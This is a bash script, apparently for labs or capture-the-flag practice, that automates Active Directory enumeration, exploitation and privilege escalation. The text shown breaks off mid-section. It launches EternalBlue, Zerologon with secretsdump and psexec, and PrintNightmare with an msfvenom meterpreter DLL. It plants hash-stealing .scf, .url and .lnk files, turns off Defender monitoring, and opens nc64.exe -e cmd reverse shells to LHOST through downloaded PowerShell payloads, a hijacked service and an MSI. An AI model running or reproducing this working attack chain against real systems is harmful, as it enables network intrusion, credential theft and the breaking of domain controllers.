#!/bin/bash

#IF UNKNOWN LEAVE BLANK
DOMAINIP="192.168.0.44"
DOMAIN="hatter.local" 
USER="alice"
PASS="P@ssw0rd1"
NTHASH="" #if you have an NT has put here

#Color variables
RED="\e[31m "
GREEN="\e[32m "
YELLOW="\e[33m "
BLUE="\e[34m "
MAGENTA="\e[35m "
CYAN="\e[36m "
RESET="\e[0m "

#Colors
E="echo -e "
R=$E$RED
G=$E$GREEN
Y=$E$YELLOW
B=$E$BLUE
M=$E$MAGENTA
C=$E$CYAN
RE=$E$RESET

$R"   ____  ____________   ______                         ___    ____ ";
$G"  / __ \/ ____/ ____/  / ____/___  __  ______ ___     /   |  / __ \ ";
$Y" / / / / / __/ /      / __/ / __ \/ / / / __ \`__ \   / /| | / / / /";
$B"/ /_/ / /_/ / /___   / /___/ / / / /_/ / / / / / /  / ___ |/ /_/ / ";
$M"\____/\____/\____/  /_____/_/ /_/\__,_/_/ /_/ /_/  /_/  |_/_____/  ";
$C"																	  ";
$RE"                                                                  ";

echo "
D) Download Tools
1) Enumerate System
2) Attack System
3) Priv Esc
99) Exit
"

read -p "Please pick one of the above: " answer


if [ $answer == 99 ]; then
	exit
fi
#Tools Download
if [ $answer == D ]; then
	$G"Updating system to make sure all tools can be found"
	sudo apt update
	$R"Downloading Tools"; $Y
	which rustscan
	if [ $? != 0 ]; then
		URL="https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb" 
		wget -c --read-timeout=5 --tries=0 $URL
		sudo dpkg -i rustscan_2.0.1_amd64.deb
	fi
	which bloodhound-python
	if [ $? != 0 ]; then
		pip3 install bloodhound --break-system-packages
	fi
	which enum4linux
	if [ $? != 0 ]; then
		sudo apt install enum4linux
	fi
	which terminator
	if [ $? != 0 ]; then
		sudo apt install terminator
	fi
	which crackmapexec
	if [ $? != 0 ]; then
		pip3 install crackmapexec --break-system-packages
	fi
	which ldapdomaindump
	if [ $? != 0 ]; then
		pip3 install ldapdomaindump --break-system-packages
	fi
	which impacket-GetNPUsers
	if [ $? != 0 ]; then
		sudo apt install impacket-scripts
	fi
	locate kerbrute_linux_amd64
	if [ $? != 0 ]; then
		which go
			if [ $? != 0 ]; then
				sudo apt install golang
			fi
		$R"Making Directory ~/Tools and installing kerbrute"
		mkdir ~/Tools
		git clone https://github.com/ropnop/kerbrute.git ~/Tools
		make all ~/Tools/kerbrute
	fi
	which neo4j
	if [ $? != 0 ]; then
		sudo apt install neo4j
	fi
exit
fi
#Enumeration
if [ $answer == 1 ]; then
	if [ -z "${DOMAINIP}" ]; then
		$R"Need an IP address to attack, please update in script";$RE
		exit
	fi
	
	if [ -z "${DOMAIN}" ]; then
		$R"No Domain Name Entered, please update from below"; $RE
		crackmapexec smb $DOMAINIP -u user -p user
		exit
	fi

	echo "
	1)  RustScan
	2)  NMAP
	3)  Kerberos Username Spray with Kerbrute (Need kerbrute installed, if not installed rerun script and install package)
	4)  GetNPUsers Username Spray to drop crackable hash
	5)  Anonymous login RPC Client
	6)  Anonymous LDAP Domain Dump
	7)  Mount SMB Share with no username / password
	8)  Enum4Linux
	9)  FTP Server anonymous Login
	10) Run some differnet Impacket Enumeration Scripts
	A)  Auto Enumeration (Let the script run everything)
	T)  Listen to Trapt (You know I had to put some music in here...)
	99) exit
	"
	read -p "Please pick one of the above: " answer
	if [ $answer == 99 ]; then
		exit
	fi

	RUST="rustscan --ulimit 5000 -a $DOMAINIP"
	NMAP="nmap -p 80,8080,8000,443,8443,8433,1337,21,22,23,25,139,445,111,5985,3389,6667,5900,88,389 -vv -T4"
	NP="$DOMAIN/ -no-pass -usersfile $USERSFILE -dc-ip $DOMAINIP"
	RPC="""rpcclient -U "" -N $DOMAINIP"""
	RPCWPASS="rpcclient -U $USER -P $PASS $DOMAINIP"
	RPCCOMMAND="-c enumdomusers,enumdomgroups > RPC.txt"
	LDAPMKDIR="mkdir LDAP"
	LDAP="ldapdomaindump ldap://$DOMAINIP:389"
	LDAPWPASS="ldapdomaindump -u $DOMAIN\\$USER -p $PASS $DOMAINIP"
	SMBMKDIR="mkdir SMB"
	SMB="sudo mount -t cifs //$DOMAINIP/$SMBLOCATION smb"
	SMBWPASS="sudo mount -t cifs -o user=$USER //$DOMAINIP/"
	ENUM4="enum4linux $DOMAINIP"
	FTP="ftp $DOMAINIP"
	IMP="Impacket.txt"
	I=impacket

	if [ $answer == 1 ]; then
		$RUST > $DOMAINIP.txt
	fi
	if [ $answer == 2 ]; then
		$NMAP
	fi
	if [ $answer == 3 ]; then
		$KER
		read -p "Users file, if you do not have one, you can use /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt: " KER_USERS_FILE
		if [ -z {$KER_USERS_FILE} ]; then
			$M"File does not exist, I guess I will do the work for you and find xato-net-10-million-usernames.txt"; $RE
			locate xato-net-10-million-usernames.txt > x.txt
			if [ $? != 0 ]; then
				$C"DAMN DUDE YOU DON'T EVEN HAVE SECLISTS, AGAIN LET ME HELP YOU!!!"
				PWD="pwd > pwd.txt"
				CD=`cat pwd.txt`
				cd /usr/share
				sudo git clone https://github.com/danielmiessler/SecLists.git
				$CD
				echo "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt > x.txt"
				X=`cat x.txt`
			fi
		KER="locate kerbrute_linux_amd64 > location.txt"
		LOC=`cat location.txt`
		$LOC userenum $X --dc $DOMAINIP -d $DOMAIN -t 200
		$B"This is going to take a while depending on size of usernames list, make I suggest getting a health snack, like celery, not McDonalds..."; $RE
		$LOC userenum $KER_USERS_FILE --dc $DOMAINIP -d $DOMAIN -t 200
		fi
	fi
	if [ $answer == 4 ]; then
		read -p "Users file for GetNPUsers: " USERSFILE
		$NP
	fi
	if [ $answer == 5 ]; then
		$R"Remember this is enumeration, seeing if RPC is open to no pass / user login. If you want to test for credential login please use the attack method"; $RE
		$RPC
	fi
	if [ $answer == 6 ]; then
		$R"Remember this is enumeration, seeing if LDAP is open to no pass / user login. If you want to test for credential login please use the attack method"
		$G"Making LDAP folder and putting domain information in there"; $R
		$LDAPMKDIR
		$LDAP
		mv domain_*.html LDAP/
		$RE
		read -p "Automatically start firefox with LDAP information that is found (if anonymous login not allow firefox will show a blank page)  (y/n)?: " answer
		if [ $answer == y ]; then
			firefox LDAP/domain_*.html
		fi
	fi
	if [ $answer == 7 ]; then
		smbclient -L "\\\\$DOMAINIP\\"
		read -p "SMBLOCATION: " SMBLOCATION
		$SMBMKDIR		
		$SMB
	fi
	if [ $answer == 8 ]; then
		$ENUM4
	fi
	if [ $answer == 9 ]; then
		$FTP
	fi	
	if [ $answer == 10 ]; then
		$M"Everything is being saved to Impacket.txt"
		$I-samrdump $DOMAIN/ -no-pass -dc-ip $DOMAINIP >> $IMP
		$I-GetADUsers $DOMAIN/ -no-pass -dc-ip $DOMAINIP >> $IMP
		$I-rpcdump $DOMAIN/ -no-pass -dc-ip $DOMAINIP >> $IMP
	fi

	if [ $answer == T ]; then
		firefox "https://www.youtube.com/watch?v=P2o57avLBEY&list=RDEMha7hYyaFwNbIbLMLspq3TA&index=2"
	fi
	if [ $answer == "A" ]; then
		ls $DOMAINIP.txt
		if [ $? != 0 ]; then
			$RUST > $DOMAINIP.txt
		fi
		$M"There you go... let it do its thing"; $ER
		if [ $USER ] && [ $PASS ]; then
			$G"Utilizing username $USER and password $PASS to enumerate with"; $RE
			if grep -w 445/tcp $DOMAINIP.txt; then
				$M"Not frozen, running some NMAP Scripts on port 445"; $RE
				nmap -p 445 -sC -sV $DOMAINIP >> $DOMAINIP.txt
				nmap -p 445 --script=smb-vuln* $DOMAINIP >> DOMAINIP.txt 
				$M"Trying to mount SMB to folder SMB"
				$G"When asked for password put in $PASS"; $RE
				smbclient -L "\\\\$DOMAINIP\\"
				read -p "SMBLOCATION: " SMBLOCATION
				$SMBWPASS$SMBLOCATION
			fi
			if grep  -w 389/tcp $DOMAINIP.txt; then
				$G"LDAP Domain Dump"; $RE
				$LDAPMKDIR
				$LDAPWPASS
				mv domain_*.html LDAP/
				read -p "Automatically start firefox with LDAP information that is found (if anonymous login not allow firefox will show a blank page)  (y/n)?: " answer
				if [ $answer == y ]; then
					firefox LDAP/domain_*.html
				fi
			fi
			if grep -w 111/tcp $DOMAINIP.txt; then
				$G"RPC Open, dumping information into RPC.txt if able"; $RE
				$RPCWPASS $RPCCOMMAND
			fi

			read -p "Since you were kind enough to provide a Username and Password would you like to run some impacket magic? (y/n)" impacket
			if [ $impacket == y ]; then
				ls -la $IMP
				if [ $? != 0 ]; then
					touch $IMP
				fi
				$G"Running some different scripts and putting into $IMP"; $RE
				$I-GetUserSPNs "$DOMAIN/$USER:$PASS -dc-ip $DOMAINIP" -request >> $IMP
				$I-lookupsid "$DOMAIN/$USER:$PASS@$DOMAINIP" >> $IMP
				$I-rpcdump "$DOMAIN/$USER:$PASS@$DOMAINIP" >> $IMP
				$I-GetADUsers "$DOMAIN/$USER:$PASS@$DOMAINIP" >> $IMP
			fi
		else
			$G"No Username or Password provided, trying some magic"
			if grep -w 445/tcp $DOMAINIP.txt; then
				nmap -p 445 -sC -sV $DOMAINIP >> $DOMAINIP.txt
				nmap -p 445 --script=smb-vuln* $DOMAINIP >> DOMAINIP.txt 
				$Y"SMB is running"
				smbclient -L "\\\\$DOMAINIP\\"
				$G"If anonymous SMB is not allowed hit enter on the next question, however if allowed we will try and mount to directory SMB"; $RE
				read -p "SMBLOCATION: " SMBLOCATION
				$SMBMKDIR		
				$SMB$SMBLOCATION
			fi
			if grep "CVE:CVE-2017-0143" $DOMAINIP.txt; then
				$R"Most likley vulnerable to Enternal Blue, can exploit if Attack is used"; $RE
				sleep 10
			fi
			if grep "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103" $DOMAINIP.txt; then
				$R"Most likley vulnerable to MS09-050, can explot if Attack is used"; $RE
				sleep 10
			fi
				$ENUM4
			if grep -w 3389/tcp $DOMAINIP.txt; then
				$G"Looks like RDP was found"; $RE
			fi
			if grep -w 389/tcp $DOMAINIP.txt; then
				$G"LDAP Found"; $RE
				$LDAPMKDIR
				$LDAP
				mv domain_*.html LDAP/
				read -p "Automatically start firefox with LDAP information that is found (if anonymous login not allow firefox will show a blank page)  (y/n)?: " answer
				if [ $answer == y ]; then
					firefox LDAP/domain_*.html
				fi
			fi
			if grep -w 111/tcp $DOMAINIP.txt; then
				ls $IMP
				if [ $? != 0 ]; then
					touch Impacket.txt
				fi
				$G"Trying some Impacket Magic with no pass and saving to $IMP"
				$I-rpcdump "$DOMAIN/" -no-pass -dc-ip "$DOMAINIP" >> $IMP
				$I-samrdump "$DOMAIN/" -no-pass -dc-ip "$DOMAINIP" >> $IMP
				$I-GetADUsers "$DOMAIN/" -no-pass -dc-ip "$DOMAINIP" >> $IMP
			fi
			if grep -w 88/tcp $DOMAINIP.txt; then
				$R"Try to kerberoast? (y/n)?: " answer
				if [ $answer == y ]; then
					$Y"#################### NOTE IF USING XATO 10 MILLION THIS IS GOING TO TAKE A WHILE ######################################"; $RE
					read -p "Users file, if you do not have one, you can use /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt: " KER_USERS_FILE
						if [ -z {$KER_USERS_FILE} ]; then
							$M"File does not exist, I guess I will do the work for you and find xato-net-10-million-usernames.txt"; $RE
							locate xato-net-10-million-usernames.txt > x.txt
							if [ $? != 0 ]; then
								$C"DAMN DUDE YOU DON'T EVEN HAVE SECLISTS, AGAIN LET ME HELP YOU!!!"
								PWD="pwd > pwd.txt"
								CD=`cat pwd.txt`
								cd /usr/share
								sudo git clone https://github.com/danielmiessler/SecLists.git
								$CD
								echo "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt > x.txt"
								X=`cat x.txt`
							fi
						KER="locate kerbrute_linux_amd64 > location.txt"
						LOC=`cat location.txt`
						$LOC userenum $X "--dc $DOMAINIP -d $DOMAIN -t 200"
						$B"This is going to take a while depending on size of usernames list, make I suggest getting a healthy snack, like celery, not McDonalds..."; $RE
						$LOC userenum $KER_USERS_FILE "--dc $DOMAINIP -d $DOMAIN -t 200"
						fi
					
				fi
			fi
		fi
	fi
fi

if [ $answer == 2 ]; then

	RUST="rustscan --ulimit 5000 -a $DOMAINIP"
	NMAP="nmap -p 80,8080,8000,443,8443,8433,1337,21,22,23,25,139,445,111,5985,3389,6667,5900,88,389 -vv -T4"
	NP="$DOMAIN/ -no-pass -usersfile $USERSFILE -dc-ip $DOMAINIP"
	RPC="""rpcclient -U "" -N $DOMAINIP"""
	RPCWPASS="rpcclient -U $USER -P $PASS $DOMAINIP"
	RPCCOMMAND="-c enumdomusers,enumdomgroups > RPC.txt"
	LDAPMKDIR="mkdir LDAP"
	LDAP="ldapdomaindump ldap://$DOMAINIP:389"
	LDAPWPASS="ldapdomaindump -u $DOMAIN\\$USER -p $PASS $DOMAINIP"
	SMBMKDIR="mkdir SMB"
	SMB="sudo mount -t cifs //$DOMAINIP/$SMBLOCATION smb"
	SMBWPASS="sudo mount -t cifs -o user=$USER //$DOMAINIP/"
	ENUM4="enum4linux $DOMAINIP"
	FTP="ftp $DOMAINIP"
	CRACKSMB="crackmapexec smb $DOMAINIP -u $USER -p $PASS"
	CRACKSMBH="crackmapexec smb $DOMAINIP -u $USER -H $NTHASH"
	CRACKLDAP="crackmapexec ldap $DOMAINIP -u $USER -p $PASS "
	CRACKLDAPH="crackmapexec smb $DOMAINIP -u $USER -p $NTHASH"
	C="CrackMapExec.txt"
	IMP="Impacket.txt"
	I=impacket
	MSF="msfconsole -x "
	ETERNAL="use exploit/windows/smb/ms17_010_eternalblue; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
	MS09="use exploit/windows/smb/ms09_050_smb2_negotiate_func_index; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"

	$R"Attacking System"; $RE
	if [ -z "${DOMAINIP}" ] || [ -z "${DOMAIN}" ]; then
		$Y"Need an IP address or domain to attack, please update in script";$RE
		exit
	fi
	ls $DOMAINIP.txt
	if [ $? != 0 ]; then
		$G"NMAP / RustScan was never ran, running now"; $RE
		$RUST > $DOMAINIP.txt
	fi

	echo "
	1)  CrackMapExec (Runs different crackmapexec tools)
	2)  SMBKiller (Runs SMBKiller Script which is for retrieving a NTLM hash from an SMB file)
	3)  SMB Attacks (Runs different attacks such as Eternal Blue and MS09-050)
	4)  Impacket Tools (Will run different impacket scripts)
	5)  Bloodhound (Run bloodhound-python on the target machine)
	6)  LDAP Domain Dump with Username and Password
	7)  Mount SMB with Username and Password
	8)  Mount FTP with Username and Password
	9)  Create .lnk to retrieve NTLM hashes from SMB Server
	10) Print Nightmare
	11) Zero Logon
	A)  Auto Attack (Let the script do its thing)
	99) exit
	"
	read -p "Please pick one of the above: " answer
	if [ $answer == 99 ]; then
		$B"Goodbye"; $RE
		exit
	fi
	
	CRACKMAP () {
		$R"Running some CrackMapExec stuff, saving to $C"; $RE
		ls $C
		if [ $? != 0 ]; then
			touch CrackMapExec.txt
		fi
		if [ $PASS != 0 ]; then 
			$G"Running against SMB"; $RE
			$CRACKSMB --shares >> $C
			$CRACKSMB --sessions >> $C
			$CRACKSMB --disks >> $C
			$CRACKSMB --loggedon-users >> $C
			$CRACKSMB --users >> $C
			$CRACKSMB --groups >> $C
			$CRACKSMB --computers >> $C
			$CRACKSMB --sam >> $C
			$CRACKSMB --lsa >> $C
			$CRACKSMB --ntds >> $C
			$C"Running against LDAP"; $RE
			$CRACKLDAP --asreproast >> $C
			$CRACKLDAP --kerberoasting >> $C
			$CRACKLDAP --trusted-for-delegation >> $C
			$CRACKLDAP --password-not-required >> $C
			$CRACKLDAP --admin-count >> $C
			$CRACKLDAP --users >> $C
			$CRACKLDAP --groups >> $C
		elif [ $NTHASH != 0 ]; then
			$G"Running against SMB"; $RE
			$CRACKSMBH --shares >> $C
			$CRACKSMBH --sessions >> $C
			$CRACKSMBH --disks >> $C
			$CRACKSMBH --loggedon-users >> $C
			$CRACKSMBH --users >> $C
			$CRACKSMBH --groups >> $C
			$CRACKSMBH --computers >> $C
			$CRACKSMBH --sam >> $C
			$CRACKSMBH --lsa >> $C
			$CRACKSMBH --ntds >> $C
			$C"Running against LDAP"; $RE
			$CRACKLDAPH --asreproast >> $C
			$CRACKLDAPH --kerberoasting >> $C
			$CRACKLDAPH --trusted-for-delegation >> $C
			$CRACKLDAPH --password-not-required >> $C
			$CRACKLDAPH --admin-count >> $C
			$CRACKLDAPH --users >> $C
			$CRACKLDAPH --groups >> $C
		else
			$R"Password or NT Hash was never given"
		fi				
	}

	SMBKILLER (){
		$R"INT for responder (ex: eth0 or tun0)"
		read INT
		$RE
		echo "[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\\\$LHOST\\%USERNAME%.icon
IconIndex=1" > @evil.url
		echo "[Shell]
Command=2
IconFile=\\\\$LHOST\\tools\\nc.ico
[Taskbar]
Command=ToggleDesktop" > @evil.scf
		echo "<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
<?mso-application progid='Word.Document'?>
<?xml-stylesheet type='text/xsl' href='\\\\$LHOST\\bad.xsl' ?>" > @bad.xsl
		echo "{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://$LHOST/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\fldrslt}}}" > test.rtf
		$R"Upload @evil.scf to Remote Share"
		"Upload @bad.xml to Remote Share"
		"Upload @test.rtf to Remote Share"
		"Upload @evil.url to Remote Share"; $RE
		terminator --new-tab -e "sudo responder -I $INT -wv"

	}
	ETERNALSMB (){
		nmap -p 445 --script=smb-vuln* -Pn >> $DOMAINIP.txt
		if grep "CVE:CVE-2017-0143" $DOMAINIP.txt; then
				$MSF$ETERNAL
		elif grep "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103" $DOMAINIP.txt; then
			$MSF$MS09
		else
			$R"Looks like we cannot get easy wins"; $RE
		fi
	}

	IMPACKET (){
		ls $IMP
		if [ $! != 0 ]; then
			touch $IMP
		fi
		if [ $PASS != 0 ]; then
			$R"Running some different Impacket Scripts and saving to impacket.txt"; $RE
			$I-GetADUsers "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP -all >> $IMP
			$I-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip $DOMAINIP -request >>  $IMP
			$I-lookupsid "$DOMAIN/$USER:$PASS@$DOMAINIP" >> $IMP
			$I-secretsdump "$DOMAIN/$USER:$PASS@$DOMAINIP" -just-dc >> $IMP
			$I-rpcdump "$DOMAIN/$USER:$PASS@$DOMAINIP" -target-ip >> $IMP
		elif [ $NTHASH != 0 ]; then
			$R"Running some different Impacket Scripts and saving to impacket.txt"; $RE
			$I-GetADUsers "$DOMAIN/$USER" -hashes ":"$NTHASH -dc-ip $DOMAINIP -all >> $IMP
			$I-GetUserSPNs "$DOMAIN/$USER" -hashes ":"$NTHASH -dc-ip $DOMAINIP -request >>  $IMP
			$I-lookupsid "$DOMAIN/$USER@$DOMAINIP" -hashes ":"$NTHASH >> $IMP
			$I-secretsdump "$DOMAIN/$USER@$DOMAINIP" -hashes ":"$NTHASH -just-dc >> $IMP
			$I-rpcdump "$DOMAIN/$USER@$DOMAINIP" -hashes ":"$NTHASH -target-ip >> $IMP
		else
			echo ""
		fi
	}

	BLOOD (){
		if [ $PASS != 0 ]; then
			mkdir BloodHound
			cd BloodHound
			bloodhound-python -d $DOMAIN -u $USER -p $PASS -c all --dns-tcp -ns $DOMAINIP
			cd ..
			$R"Put everything in BloodHound folder"; $RE
		elif [ $NTHASH != 0 ]; then
			mkdir BloodHound
			cd BloodHound
			bloodhound-python -d $DOMAIN -u $USER --hashes ":"$NTHASH -c all --dns-tcp -ns $DOMAINIP
			cd ..
			$R"Put everything in BloodHound folder"; $RE
		fi
	}

	LDAP (){
		if grep -p 389/TCP $DOMAINIP.txt; then
			if [  $PASS != 0 ]; then
				mkdir LDAP
				cd LDAP
				ldapdomaindump $DOMAINIP -u "$DOMAIN\\$USER" -p "$PASS"
				cd ..
				$Y"Put everything in LDAP folder"; $RE
				read -p "First part of domain (ex: test.local first part is test, do not add period)" first
				read -p "Second part of domain (ex: test.local second part is test, do not add period)" second
				$G"Saving everything to ldap.txt and retrieving descriptions and samaccountnames for easier access"
				ldapsearch -H ldap://$DOMAINIP -D $USER -W $PASS -x -b "DC=$first,DC=$second" '(objectclass=person)' > dump.txt
				cat ldap.txt | grep -i description > des.txt
				cat ldap.txt | grep -i samaccountname > sam.txt
				cat dump.txt des.txt sam.txt > ldap.txt
				rm -rf dump.txt
				rm -rf des.txt
				rm -rf sam.txt
			elif [ $NTHASH != 0 ]; then
				mkdir LDAP
				cd LDAP
				ldapdomaindump $DOMAINIP -u "$DOMAIN\\$USER" -p ":$PASS"
				cd ..
				$Y"Put everything in LDAP folder"; $RE
			else
				echo ""
			fi
		else
			$R"LDAP Not Running"; $RE
		fi
	}

	SMBMOUNT (){
		if grep -i 445/TCP $DOMAINIP.txt; then
			$Y"Making directory SMB to mount SMB to"; $RE
			smbclient -L "\\\\$DOMAINIP\\" -U $USER -P $PASS
			read -p "SMB Share to mount?" mountsmb
			mkdir SMB
			sudo mount -t cifs "//$DOMAINIP/$mountsmb" SMB -o user="$USER",password="$PASS"
		else
			$R"SMB not running"; $RE
		fi
	}

	FTPMOUNT (){
		if grep -i 21/TCP $DOMAINIP.txt; then
			$Y"Making directory FTP to mount FTP to"; $RE
			mkdir FTP
			curlftpfs "$USER:$PASS@$DOMAINIP" FTP
		else
			$R"FTP not running"; $RE
		fi
	}

	LNK (){
		wget https://raw.githubusercontent.com/bufferbandit/mslink.sh/main/mslink.sh
		read -p "LHOST" LHOST
		read -p ".lnk file name (ex: share NOTE DO NOT ADD THE .lnk TO THE END):" LNKFILE 
		bash mslink.sh -l open_me -n hook -i \\\\$LHOST\\share -o $LNKFILE.lnk
		$Y"Zipping $LNKFILE.lnk"; $RE
		zip $LNKFILE.zip $LNKFILE.lnk
		$R"Opening another terminal to retrieve NTLM, if you do not have terminator up and running will have to do yourself with the share name of share"
		terminator --new-tab -e	"impacket-smbserver share . -smb2support;bash"
	}

	PRINTNIGHTMARE (){
		impacket-rpcdump @$DOMAINIP | egrep 'MS-RPRN|MS-PAR' >> $DOMAINIP.txt
		impacket-rpcdump @$DOMAIN | egrep 'MS-RPRN|MS-PAR' >> $DOMAINIP.txt
		sleep 2
		if grep -i "Print System Remote Protocol" $DOMAINIP.txt; then
			$R"System may be vulnerable, continuing"
			$B"Installing necessary tools and creating new folder";$RE
			python3 -m venv impakt
			cd impakt
			source bin/activate
			git clone https://github.com/cube0x0/impacket
			cd impacket
			pip2 install .
			pip3 install .
			python3 ./setup.py install
			$Y"Creating MSFVenom shell.dll file for 64 bit Windows system"; $RE
			read -p "LHOST" LHOST
			read -p "LPORT" LPORT
			$Y"Creating MSFVenom File and naming shell.dll"; $RE
			msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll > shell.dll
			cp shell.dll impakt/impacket
			cd impakt/impacket
			terminator --new-tab -e	"impacket-smbserver share . -smb2support;bash"
			$R"Trying to copy shell.dll to Remote Host"; $RE
			#If impacket is not within your path, you may need to put the full path below
			wget https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py
			python3 CVE-2021-1675.py $DOMAIN/$USER:$PASS@$DOMAINIP "\\\\$LHOST\\share\\shell.dll"
		else
			$G"Does not seem vulnerable"
		fi
	}

	ZEROLOGON (){
		crackmapexec smb $DOMAINIP -u fjkdsf -p jskfsd
		$R"Should see SMB Domain name above"
		$Y"Downloading Zero Logon Script";$RE
		sudo git clone https://github.com/sho-luv/zerologon.git
		cd zerologon
		$R"Running exploit, this may take a while"
		sudo python3 zerologon.py -exploit "$DOMAINIP" > ../zero.txt
		cd ..
		if grep "Target vulnerable, changing account password to empty string" zero.txt; then
			$R"Running Secrets Dump and saving to secretsdump.txt"; $RE
			secretsdump.py -no-pass -just-dc "$DOMAIN"/"$SHARENAME\$"@$DOMAINIP > secretsdump.txt
			HASH=$(cat secretsdump.txt | sed '5q;d' | cut -d ':' -f 3,4)
			$Y"Trying to login through psexec to $DOMAINIP"
			impacket-psexec -hashes $HASH administrator@$DOMAINIP 
		else
			$B'Does not seem vulnerable'
		fi		
	}


	if [ $answer == 1 ]; then
		CRACKMAP
	fi

	if [ $answer == 2 ]; then
		SMBKILLER
	fi

	if [ $answer == 3 ]; then
		ETERNALSMB		
	fi	

	if [ $answer == 4 ]; then
		IMPACKET
	fi

	if [ $answer == 5 ]; then
		BLOOD
	fi

	if [ $answer == 6 ]; then
		LDAP
	fi

	if [ $answer == 7 ]; then
		SMBMOUNT
	fi

	if [ $answer == 8 ]; then
		FTPMOUNT
	fi

	if [ $answer == 9 ]; then
		LNK
	fi

	if [ $answer == 10 ]; then
		PRINTNIGHTMARE
	fi

	if [ $answer == 11 ]; then
		ZEROLOGON
	fi

	if [ $answer == A ]; then
		$R"This does not run Zero or PrintNightmare"; $RE
		sleep 3
		$Y"Lean with it, rock with it
		When we gonna stop with it?
		Lyrics that mean nothing
		We were gifted with thought
		
		Is it time to move our feet
		To an introspective beat
		It ain't the speakers that bump hard
		It's our hearts that make the beat"; $RE


###################################### LEAVE CRACK MAP EXEC AT THE BOTTOM OR IT WILL MESS WITH STUFF ##################################################################

		ETERNALSMB
		LDAP
		SMBMOUNT
		FTPMOUNT
		IMPACKET
		BLOOD
		LNK
		SMBKILLER
		CRACKMAP
	fi
fi
if [ $answer == 3  ]; then
	echo "
	1) Auto Attack
	2) Find Problems (Do not attack, just state what is found if anything)
	99) Exit
	" 
	read -p "Please choose one of the above: " answer
	if [ $answer == 99 ]; then
		exit
	fi

	if [ $answer == 1 ]; then
		read -p "This script can be dangerous against a target machine, ultimately breaking a machine. Not all of these have been able to be tested yet. Press enter to continue or CTRL+C to quit:"
		$R"This will try some different things in preparation for getting onto the system, note all exploits will be automatically ran"
		$Y"If you are NOT running Terminator Terminal things may not work correctly"
		sleep 2
		$G"Saving to WinExe.txt";$RE
		read -p "LHOST" LHOST
		read -p "Local web server port, also start one if you have not yet" WPORT
		read -p "LPORT" LPORT
		WIN="winexe -U $DOMAINIP/$USER%$PASS"
		W=WinExe.txt
		P="powershell -c "
		$G"Whoami"; $RE
		$WIN $P "mkdir C:\Temp"
		$WIN "whoami /all" > $W
		$G"SystemInfo"; $RE
		$WIN "syteminfo" >> $W
		$G"Trying to shut down defender"; $RE
		$WIN $P 'set-mppreference -disablerealtimemonitoring $TRUE'
		terminator --new-tab -e "python3 -m http.server $WPORT;bash" 
		if grep -w "SeImpersonatePrivilege" $W; then
			$R"SeImpersonatePrivilege is enabled for $USER"
			$G"Trying SweetPotato"; $RE
			$WIN $P  "wget -usebasicparsing http://$LHOST:$WPORT/nc64.exe -outfile C:\Temp\nc64.exe"
			echo "Invoke-SweetPotato -p C:\Temp\nc64.exe -a -e cmd $LHOST $LPORT" >> Invoke-SweetPotato.ps1
			terminator --new-tab -e "nc -lvnp $LPORT;bash"
			$WIN $P "iex (iwr -usebasicparsing http://$LHOST:$WPORT/Invoke-SweetPotato.ps1)"
			wget "https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe"
			cp ~/Downloads/PrintSpoofer.exe .
			$WIN $P  "wget -usebasicparsing http://$LHOST:$WPORT/PrintSpoofer.exe -outfile C:\Temp\print.exe"
			$WIN $P "C:\Temp\print.exe -c ""C:\Temp\nc64.exe -e cmd $LHOST $LPORT" 
		fi
		$G"Trying to run PowerUp, AMSI may stop us"; $RE
		wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
		echo "Invoke-AllChecks" >> PowerUp.ps1
		$WIN $P "iex (iwr -usebasicparsing http://$LHOST:$WPORT/PowerUp.ps1)" >> $W
		if grep -w "SeManageVolumePrivilege" $W; then
			$R"SeManageVolumePrivilege is enabled for $USER"; $RE
			wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
			$WIN $P  "wget -usebasicparsing http://$LHOST:$WPORT/SeManageVolumeExploit.exe -outfile C:\Temp\Volume.exe"
			$WIN $P "C:\Temp\Volume.exe"
			$R"If the exploit worked you now have read and write authority throughout all folders, even administrator, testing with dir"; $RE
			$WIN $P "dir C:\Users\Administrator\Desktop" >> $W
		fi
	
		if grep -w "Server Operators" $W; then
			$R"Server Operators is enabled for $USER"; $RE
			$WIN $P "wget -usebasicparsing http://$LHOST:$WPORT/nc64.exe -outfile C:\Temp\nc64.exe"
			$WIN $P "sc.exe config vss binpath=""C:\\Temp\\nc64.exe -e cmd.exe $LHOST $LPORT"
			terminator --new-tab -e "nc -lvnp $LPORT;bash"
			$WIN "stop-service vss"
			$WIN "start-service vss"
		fi
	
		if grep -w "DnsAdmins" $W; then
			$R"DNS Admins is enabled for $USER";$RE
		fi
	
		if grep -w "Write-UserAddMSI" $W; then
			$R"Always install elevated is running"; $RE
			msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi > shell.msi
			$WIN $P  "wget -usebasicparsing http://$LHOST:$WPORT/shell.msi -outfile C:\Temp\shell.msi"
			terminator --new-tab -e "nc -lvnp $LPORT;bash"
			$WIN $P "msiexec /quiet /qn /i C:\Windows\Temp\shell.msi"
			$Y"Check other tab to see if you got a call back as system"; $RE
		fi
		$G"Running PrintNightmare PowerShell Script"; $RE
		wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
		$WIN $P "iex (iwr -usebasicparsing http://$LHOST:$WPORT/CVE-2021-1675.ps1)" >> $W
